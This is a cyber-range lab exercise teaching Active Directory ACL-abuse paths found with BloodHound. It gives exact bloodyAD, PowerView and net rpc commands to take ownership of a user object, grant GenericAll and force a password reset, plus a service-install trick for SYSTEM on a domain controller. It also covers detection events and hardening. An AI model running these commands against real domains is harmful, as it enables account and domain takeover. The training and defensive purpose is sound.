    Exercise 2.4: Path of Least Resistance

    Before You Begin

    BloodHound finds the path. You execute the plan. Those are different skills. The collector finds an edge labeled WriteOwner between an IT helpdesk group and a privileged user; the human turns that edge into the right command (Set-DomainObjectOwner, then Add-DomainObjectAcl, then Set-DomainUserPassword) at the right moment. Many junior consultants miss the second step. They paste a screenshot of the BloodHound graph into a report, leave the execution as "exercise for the reader," and the deliverable feels theoretical.

    Exercise 2.4 asks you to walk one short path edge by edge and write the execution plan a senior consultant would expect to see.

    Tools required: bloodhound-python, BloodHound CE, plus the standard AD tooling (netexec, bloodyAD, net rpc, PowerView). Pre-installed on Kali.

    Scenario

    Marcus Bell: "BloodHound gives you the route. The route is not the attack. Walk through the path and tell me, edge by edge, what you would do. I do not want a screenshot of the graph. I want a numbered plan I could hand to a junior consultant."

    The seeded path is short and concrete:

    j.chen --MemberOf--> IT_HelpDesk --WriteOwner--> m.tanaka --ForceChangePassword--> m.tanaka --MemberOf--> Server Operators

    Submit a four-step numbered plan, one step per edge, naming the edge type and the exact tool/command you would use to traverse it. The scorer returns the flag when your edge identifications match the expected sequence.

    Credentials:

    Username Password
    j.chen Welcome2026#

    Domain: corp.nordport.local

    Your Objectives

    • Collect the domain with BloodHound as j.chen
    • Identify the four-edge path from j.chen to Server Operators membership
    • Name each edge type
    • For each edge, write the command (or short script) you would execute to traverse it
    • Submit the plan to the scorer and recover the flag

    Background: Edges, Tradecraft, and Why the Two Are Different

    BloodHound shows you a graph of who can do what. Each edge type maps to a different attack technique with its own tooling, side effects, and detection profile. Knowing which edge is in the path is the easy part; knowing which command turns that edge into compromise is the harder part.

    A taxonomy of common attacking edges

    Edge What it grants How an attacker uses it
    MemberOf Source belongs to target group; inherits its rights Passive. No action needed; the source already has whatever the target group grants.
    AdminTo Source is local admin on target computer psexec.py user@host, wmiexec.py, evil-winrm, etc. Use any admin-only protocol.
    CanRDP Source can RDP to target computer xfreerdp /u:user /p:pass /v:host. Useful as a foothold for further pivoting.
    GenericAll Source has full control on target net rpc password to reset, or bloodyAD set-attribute to set any attribute.
    GenericWrite Source can write any property on target Add SPN to user object (now Kerberoastable), set userAccountControl flags, set msDS-AllowedToDelegateTo.
    WriteDACL Source can change target's ACL dacledit.py write to add a new ACE granting yourself further rights.
    WriteOwner Source can take ownership of target Set-DomainObjectOwner (PowerView) or bloodyAD set-owner, then add yourself a GenericAll ACE, then ForceChangePassword.
    ForceChangePassword Source can reset the target user's password without knowing the old net rpc password "user" "newpass" -U "src%pass" -S dc.
    AddMember Source can add members to the target group net rpc group addmem "target_group" "yourself" -U ....
    AllowedToDelegate Source is configured for constrained delegation to target service getST.py -spn target -impersonate Administrator <user>.
    AllowedToAct Source is in target computer's RBCD list getST.py -spn cifs/target.fqdn -impersonate Administrator <controlled_account>.
    HasSession Source user has an active session on target computer Compromise the computer to extract the source user's credential from memory.

    The pattern: every edge tells you the right tool for that step. Mismatch the tool and you waste the path.

    Why WriteOwner needs three commands

    WriteOwner only grants you the ability to take ownership of the target object. Owning it does not by itself let you do anything; you have to add yourself an ACE that grants further rights. The full sequence:

    1. Set-DomainObjectOwner -Identity m.tanaka -OwnerIdentity j.chen (PowerView); now you own the object.
    2. Add-DomainObjectAcl -TargetIdentity m.tanaka -PrincipalIdentity j.chen -Rights All; now you have GenericAll on the object.
    3. net rpc password "m.tanaka" "<new>" -U "CORP\j.chen%Welcome2026#" -S corp-dc01; now you have reset the password.

    Many graphs render WriteOwner followed by a second edge Owns, then GenericAll from the owner. BloodHound CE collapses this into a single WriteOwner arrow; you must mentally expand it into the three commands. The scorer for this exercise treats the chain as a single edge labelled WriteOwner.

    Tool Primer

    bloodhound-python collection

    bloodhound-python -u j.chen -p 'Welcome2026#' \
  -d corp.nordport.local -ns <DC_IP> \
  -c All --zip

    BloodHound CE Cypher: shortest path to Server Operators

    MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE n.name = 'J.CHEN@CORP.NORDPORT.LOCAL' AND m.name = 'SERVER OPERATORS@CORP.NORDPORT.LOCAL' RETURN p

    Canonical BHCE form per the official docs: one MATCH, one WHERE with AND-joined predicates, RETURN p for the graph view. Keep the entire query on one logical line; pasted line wraps inside the string literals break the comparison.

    The result graph shows the four edges.

    PowerView WriteOwner traversal

    # Step 1: take ownership
Set-DomainObjectOwner -Identity m.tanaka -OwnerIdentity j.chen

# Step 2: grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity m.tanaka -PrincipalIdentity j.chen -Rights All

    bloodyAD WriteOwner traversal (Linux-native)

    bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  set owner m.tanaka j.chen

bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  add genericAll m.tanaka j.chen

    Force password change

    net rpc password "m.tanaka" "NewPass2026#" \
  -U "CORP\j.chen%Welcome2026#" -S corp-dc01

    Walkthrough

    Step 1: Collect

    Before any path-finding you need a fresh data set in BloodHound CE. bloodhound-python is the Linux-native collector that walks LDAP, SAMR, and SMB to produce the JSON files BloodHound ingests. The collection method All covers every supported data type; the smaller methods (Group, LocalAdmin, Session) are for repeat collections after the first full one.

    Kali - Run bloodhound-python and ingest

    mkdir -p ~/work/adpt-2-04 && cd ~/work/adpt-2-04
bloodhound-python -u j.chen -p 'Welcome2026#' \
  -d corp.nordport.local -ns <DC_IP> -c All --zip
    Flag Effect
    -u, -p, -d Username, password, domain.
    -ns <DC_IP> Name server to use for SRV/A lookups. Use the literal DC IP (e.g. 10.100.2.10); a hostname here only works if your /etc/resolv.conf already points at the DC, which the standard Kali RangeBox does not.
    -c All Collect every data type: ACLs, sessions, groups, trusts, GPOs, certificates.
    --zip Bundle the JSON output into one timestamped zip ready for ingest.

    Output is a file like 20260425103015_bloodhound.zip. Open BloodHound CE, click the upload icon, and drop the zip in. Ingest takes 30 to 90 seconds.

    Step 2: Find the Path

    The BloodHound UI offers a built-in shortest-path button, but the Cypher query in the Tool Primer above is more reproducible (you can paste it into a report). Either way, you are asking the graph database for a directional path from your foothold node to a target node, capped at 15 hops to keep the search tractable.

    In the BloodHound search bar, type j.chen and select her node. From her node, right-click and select Shortest Paths, then set the target to Server Operators. Or paste the Cypher from the Tool Primer into the Run Raw Query box.

    You should see four edges connecting J.CHEN -> IT_HELPDESK -> M.TANAKA -> SERVER OPERATORS. The middle edge will be WriteOwner. BloodHound also shows the implicit ForceChangePassword capability that GenericAll enables once you take ownership; the platform draws it as a separate edge for clarity.

    Step 3: Name the Edges

    Reading edges off the graph is a discipline: edge labels are precise vocabulary, and if you call WriteOwner "WriteDACL" in your report you tell the defender to look in the wrong place. Build the table below by hovering each arrow in the BloodHound UI; the tooltip shows the canonical label.

    Step From Edge To
    1 j.chen MemberOf IT_HelpDesk
    2 IT_HelpDesk WriteOwner m.tanaka
    3 m.tanaka ForceChangePassword (via GenericAll after taking ownership) m.tanaka
    4 m.tanaka MemberOf Server Operators

    Step 4: Write the Plan

    The plan you submit should be commands, not narrative. Example:

    1. MemberOf (j.chen -> IT_HelpDesk):
   Already a member; no action required. Confirm with:
     net rpc group members "IT_HelpDesk" -U "CORP\j.chen%Welcome2026#" -S corp-dc01

2. WriteOwner (IT_HelpDesk -> m.tanaka):
   Take ownership and grant ourselves GenericAll on m.tanaka:
     bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
       set owner m.tanaka j.chen
     bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
       add genericAll m.tanaka j.chen

3. ForceChangePassword (m.tanaka -> m.tanaka):
   Reset m.tanaka's password to a value we control:
     net rpc password "m.tanaka" "TempReset2026#" \
       -U "CORP\j.chen%Welcome2026#" -S corp-dc01

4. MemberOf (m.tanaka -> Server Operators):
   Authenticate as m.tanaka with the new password; she inherits Server Operators rights:
     netexec smb corp-dc01 -u m.tanaka -p 'TempReset2026#' --local-auth=False
   With Server Operators rights we can manipulate domain services for further escalation.

    Step 5: Submit to the Scorer

    A small HTTP service inside the lab subnet validates plans. It accepts a JSON body listing the four edge types and the four target node names; if both arrays match the expected sequence the service returns the flag. The point of the JSON gate is to force you to identify edges correctly rather than describe them in handwavy prose.

    The scorer URL is shown in the Active Lab View on scorer.adpt.local:8080.

    Kali - Submit the plan

    cat > /tmp/adpt-2-04-plan.json <<'EOF'
{
  "edges": ["MemberOf", "WriteOwner", "ForceChangePassword", "MemberOf"],
  "targets": ["IT_HelpDesk", "m.tanaka", "m.tanaka", "Server Operators"]
}
EOF

curl -s -X POST -H 'Content-Type: application/json' \
  -d @/tmp/adpt-2-04-plan.json \
  http://scorer.adpt.local:8080/submit
    Flag Effect
    cat > file <<'EOF' ... EOF Heredoc; quoted 'EOF' disables variable expansion (literal JSON).
    -s Silent mode; no curl progress bar.
    -X POST HTTP method.
    -H 'Content-Type: application/json' Required for the scorer's body parser.
    -d @<file> Read body from file rather than command line.

    A correct submission returns {"flag":"OCR{...}"}. An incorrect submission returns which edge(s) were wrong (for example {"errors":[{"index":1,"got":"GenericAll","expected":"WriteOwner"}]}); fix the entry and resubmit.

    Submit the flag to the OpenCyberRange platform.

    Common gotchas

    • Edge label casing: the scorer matches case-insensitively on edge names (writeowner works) but exactly on target names (m.tanaka not M.Tanaka).
    • GenericAll vs WriteOwner: a freshly seeded path may surface as GenericAll if BloodHound has cached an older collection. Re-collect after Step 1; do not paste the cached graph from a previous chapter.
    • DNS for the scorer: scorer.adpt.local resolves through the DC. If corp-dc01 is not your /etc/resolv.conf's nameserver, replace the hostname with the IP shown in the Active Lab View.
    • PowerView vs bloodyAD execution: PowerView requires a Windows host (run from a beachhead, not Kali). bloodyAD runs natively on Kali. Pick one and stick with it within a single plan.

    Blue Team Perspective

    Each edge traversal leaves its own log signature. A SOC pulling four signals across two minutes from one source IP has a high-confidence ACL-abuse alert.

    Step Activity Event ID
    WriteOwner DACL change on user object 5136 (directory service object modified)
    WriteOwner Owner SID change 4738 + 4670 (user account changed + permission granted)
    ForceChangePassword Password reset by another user 4724 (account password reset)
    MemberOf transition New Server Operators rights exercised 4625 / 4624 burst on DCs

    Where SOCs catch this in practice

    The single best detection is on event 4724: a user resetting another user's password where the resetter is not on the helpdesk allow-list. Most environments do not detect WriteOwner / WriteDACL writes because they do not enable advanced object-access auditing on every user object. Microsoft Defender for Identity ships a built-in detection ("Suspicious modification of a sensitive group") that fires when the target is in any privileged group.

    Hardening Note

    The lesson of this chapter is that ACL hygiene is the work. Most domains have orphaned ACEs that were granted years ago for a one-off task and never revoked. The list below is the realistic remediation menu.

    ACL-path hardening

    • Run BloodHound against your own domain quarterly. Sort paths to Domain Admins and Tier-0 groups by length. Eliminate the shortest paths first.
    • Audit Server Operators, Backup Operators, Print Operators, and Account Operators membership; treat them as Tier-0-equivalent.
    • Build a SIEM detection on event 4724 with allow-list of legitimate password-reset principals.
    • Enable advanced object-access auditing on every user object in Tier-0 OUs (event 5136).
    • Migrate password-reset rights to a least-privilege delegation model: helpdesk staff reset only specific OUs, not all of Domain Users.
    • Archive every BloodHound collection so you can diff this quarter against last quarter and see new edges as they appear.

    Analysis Questions

    1. The WriteOwner edge requires three commands to traverse, while ForceChangePassword requires one. Why does BloodHound represent both as a single edge?

    Reveal Answer

    BloodHound models edges by the underlying right that makes the chain possible, not by the count of commands required. WriteOwner is the originating right; once you have it, the rest of the chain (take ownership, grant yourself GenericAll, then exercise GenericAll however you like) is determined. The graph compresses the determinism into a single edge so the path search runs efficiently. The cost is that the edge is misleading to a reader who has not internalized the WriteOwner -> Own -> GenericAll progression. Operators learn to mentally expand each edge during the planning step. In BloodHound's documentation each edge has a "Help" panel describing the underlying technique and the recommended tooling.

    2. The seeded path goes through Server Operators rather than Domain Admins. What does Server Operators membership get you, and why is that often more useful than DA?

    Reveal Answer

    Server Operators is a built-in group that allows members to start, stop, pause, and configure services on Domain Controllers; install and configure printer drivers; format DC hard drives; and shut down DCs. None of those rights look like Domain Admin on paper, but several of them are equivalent in effect. The classic abuse: install a service that runs as LOCAL SYSTEM on a DC, point it at a payload of your choice, start the service. That payload then runs as NT AUTHORITY\SYSTEM on a DC, which means you can secretsdump the DC, dump ntds.dit, or write to lsass. Membership in Server Operators does not show up in audits searching for Domain Admins and rarely triggers alerts. For a defender concerned with privileged-group hygiene, Server Operators is one of the most undermonitored Tier-0-equivalent groups.

    3. The four-edge path is short on purpose. What does that reveal about why most AD compromises succeed?

    Reveal Answer

    Real AD compromises rarely require ten-edge chains. Most successful chains are 2 to 5 edges, often involving a single misconfigured ACL, a single weak service account password, or a single LAPS read delegation. Defenders often imagine attackers as patient adversaries chaining many tiny mistakes; in practice, attackers find one big mistake and walk straight through it. The defensive implication is that identifying and removing your shortest paths is the highest-yield AD hardening activity. Run BloodHound against your own domain quarterly. Sort paths to Domain Admins by length. Eliminate the shortest ones first. Each path you remove forces the next attacker into longer, noisier, more interactive routes.

    Key Takeaways

    • BloodHound shows the route; the human translates each edge into a concrete command.
    • WriteOwner is a three-command sequence: take ownership, grant GenericAll, exercise it.
    • Server Operators is functionally equivalent to Domain Admin via the service-on-DC technique.
    • Real attack paths are typically 2 to 5 edges, not 10. Eliminate your shortest paths first.
    • A submitted plan is more useful than a screenshot; defenders want to see the commands, not the picture.

    Cheat Sheet Recap

    The four operations below traverse the full WriteOwner-to-Server-Operators path. Memorize the order; it appears in every ACL-abuse exercise from here on.

    Step Command
    1. Take ownership bloodyAD -d <domain> -u <atk> -p '<pw>' --host <dc> set owner <target> <atk>
    2. Grant yourself GenericAll bloodyAD -d <domain> -u <atk> -p '<pw>' --host <dc> add genericAll <target> <atk>
    3. Force-change password net rpc password "<target>" "<newpw>" -U "<DOMAIN>\<atk>%<pw>" -S <dc>
    4. Validate as target netexec smb <dc> -u <target> -p '<newpw>' -d <domain>

    Spaced Repetition

    Card 1: WriteOwner Three-Command Sequence

    Q: List the three commands (in order) that traverse a WriteOwner edge from attacker to target, ending in a working password reset.

    Answer
    1. Set-DomainObjectOwner -Identity target -OwnerIdentity attacker (PowerView) or bloodyAD set owner target attacker. 2. Add-DomainObjectAcl -TargetIdentity target -PrincipalIdentity attacker -Rights All (PowerView) or bloodyAD add genericAll target attacker. 3. net rpc password "target" "<newpass>" -U "DOM\attacker%pass" -S <dc>. Step 1 sets ownership, step 2 grants you GenericAll because the owner can always set permissions, step 3 exercises GenericAll to reset the password.

    Card 2: Server Operators Privilege

    Q: Name the canonical attack that turns Server Operators membership into Domain Admin equivalence.

    Answer

    Install a Windows service on a Domain Controller that runs as LOCAL SYSTEM with the payload of your choice (sc.exe create EvilSvc binPath= "C:\path\to\payload.exe" type= own start= demand), then start it (sc.exe start EvilSvc). The payload runs as NT AUTHORITY\SYSTEM on the DC, which can secretsdump the DC, write to LSASS, or perform any Tier-0 action.

    Card 3: ForceChangePassword in One Line

    Q: Write the net rpc command to reset m.tanaka's password to Temp2026# using j.chen / Pass# against corp-dc01.

    Answer 
    net rpc password "m.tanaka" "Temp2026#" \
  -U "CORP\j.chen%Pass#" -S corp-dc01

    Equivalent on Linux with bloodyAD: bloodyAD -d corp.nordport.local -u j.chen -p 'Pass#' --host corp-dc01 set password m.tanaka 'Temp2026#'.

    Card 4: BloodHound Cypher for Shortest Path

    Q: Write the Cypher query for the shortest path from j.smith@corp.local to the Server Operators group at corp.local.

    Answer 
    MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE n.name = 'J.SMITH@CORP.LOCAL' AND m.name = 'SERVER OPERATORS@CORP.LOCAL' RETURN p

    Canonical BHCE form: single MATCH, single WHERE with AND, RETURN p so the graph view renders. All names UPPERCASE with @DOMAIN.TLD suffix. [*1..] is unbounded - BHCE's planner handles it efficiently for shortestPath.

    Card 5: Why Plans Beat Screenshots

    Q: Why is a numbered execution plan a better deliverable than a BloodHound screenshot when reporting a finding?

    Answer

    A screenshot tells the reader an attack path exists. A numbered plan tells them what an attacker would do next, which lets them prioritize remediation by effort vs payoff. Defenders can also feed a plan into change management ("if we remove the WriteOwner ACE, step 2 fails and the chain breaks") whereas they cannot do that with a graph. Plans also pull the consultant out of the implicit assumption that "everyone knows what WriteOwner means"; many client-side readers do not, and a plan with the actual commands carries the explanation.
